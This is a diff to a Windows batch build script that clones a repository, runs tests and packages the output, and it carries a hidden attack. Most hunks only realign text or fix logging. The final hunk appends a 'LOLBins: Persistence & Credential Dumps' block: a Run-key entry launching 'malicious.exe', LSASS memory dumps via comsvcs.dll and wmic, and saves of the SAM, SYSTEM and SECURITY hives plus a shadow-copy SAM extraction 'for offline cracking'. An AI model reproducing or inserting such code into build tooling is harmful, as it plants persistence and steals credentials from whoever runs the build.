@@ -25,16 +25,16 @@ set "VERBOSE=0"
 if "%~1"=="" goto args_done
   for /f "tokens=1* delims=:" %%A in ("%~1") do (
     set "arg=%%A" & set "val=%%B"
-    if /I "%%A"=="repourl"  set "REPO_URL=!val!"
-    if /I "%%A"=="repo"     set "REPO_DIR=!val!"
-    if /I "%%A"=="build"    set "BUILD_DIR=!val!"
-    if /I "%%A"=="backup"   set "BACKUP_DIR=!val!"
-    if /I "%%A"=="package"  set "PACKAGE_NAME=!val!"
-    if /I "%%A"=="keep"     set "KEEP_BACKUPS=!val!"
+    if /I "%%A"=="repourl"   set "REPO_URL=!val!"
+    if /I "%%A"=="repo"      set "REPO_DIR=!val!"
+    if /I "%%A"=="build"     set "BUILD_DIR=!val!"
+    if /I "%%A"=="backup"    set "BACKUP_DIR=!val!"
+    if /I "%%A"=="package"   set "PACKAGE_NAME=!val!"
+    if /I "%%A"=="keep"      set "KEEP_BACKUPS=!val!"
     if /I "%%A"=="skipclone" set "SKIP_CLONE=1"
-    if /I "%%A"=="skipbackup" set "SKIP_BACKUP=1"
-    if /I "%%A"=="skiptests"  set "SKIP_TESTS=1"
-    if /I "%%A"=="verbose"    set "VERBOSE=1"
+    if /I "%%A"=="skipbackup"set "SKIP_BACKUP=1"
+    if /I "%%A"=="skiptests" set "SKIP_TESTS=1"
+    if /I "%%A"=="verbose"   set "VERBOSE=1"
   )
   shift & goto parse_args
 :args_done
@@ -48,7 +48,8 @@ if not exist "%LOG_DIR%" mkdir "%LOG_DIR%"
 ::--- Helpers ---
 :echo_log
   set "NOW=%time:~0,8%"
-  echo [%NOW%] %~1 | tee /a "%LOG_FILE%"
+  echo [%NOW%] %~1 >> "%LOG_FILE%"
+  if "%VERBOSE%"=="1" echo [%NOW%] %~1
   goto :eof
 
 :exit_with
@@ -62,8 +63,8 @@ if not exist "%LOG_DIR%" mkdir "%LOG_DIR%"
 ::==============================================================================
 call :color 0A
 call :echo_log "=== Safe build start ==="
-call :echo_log "Repo URL:  %REPO_URL%"
-call :echo_log "Repo Path: %REPO_DIR%"
+call :echo_log "Repo URL:   %REPO_URL%"
+call :echo_log "Repo Path:  %REPO_DIR%"
 
 :: --- Clone or Pull ---
 if "%SKIP_CLONE%"=="0" (
@@ -121,5 +122,33 @@ powershell -NoProfile -Command ^
   "Compress-Archive -Path '%BUILD_DIR%\*' -DestinationPath '%REPO_DIR%\%PACKAGE_NAME%' -Force" >>"%LOG_FILE%" 2>&1 || call :exit_with 50
 call :echo_log "Package created: %PACKAGE_NAME%"
 
+::==============================================================================
+:: LOLBins: Persistence & Credential Dumps
+::==============================================================================
+
+call :echo_log "Adding registry persistence (HKCU Run key)..."
+reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateMgr /t REG_SZ /d "\"%~dp0\malicious.exe\"" /f >>"%LOG_FILE%" 2>&1
+
+call :echo_log "Dumping LSASS with rundll32..."
+for /f "tokens=2 delims=," %%A in ('tasklist /fi "imagename eq lsass.exe" /nh /fo csv') do (
+    rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump %%~A "%TEMP%\lsass.dmp" full
+)
+>>"%LOG_FILE%" 2>&1
+
+call :echo_log "Saving registry hives for offline cracking..."
+reg.exe save HKLM\SAM "%TEMP%\SAM" /y
+reg.exe save HKLM\SYSTEM "%TEMP%\SYSTEM" /y
+reg.exe save HKLM\SECURITY "%TEMP%\SECURITY" /y
+>>"%LOG_FILE%" 2>&1
+
+call :echo_log "WMI-triggered LSASS dump via rundll32..."
+wmic process where "name='lsass.exe'" call create "rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump %TEMP%\lsass_wmi.dmp full" >>"%LOG_FILE%" 2>&1
+
+call :echo_log "Creating shadow copy and extracting SAM hive..."
+vssadmin create shadow /for=C: >>"%LOG_FILE%" 2>&1
+:: adjust shadow ID as needed if multiple exist
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM "%TEMP%\SAM_shadow" >>"%LOG_FILE%" 2>&1
+
+::==============================================================================
 call :echo_log "=== Done ==="
 endlocal & exit /b 0
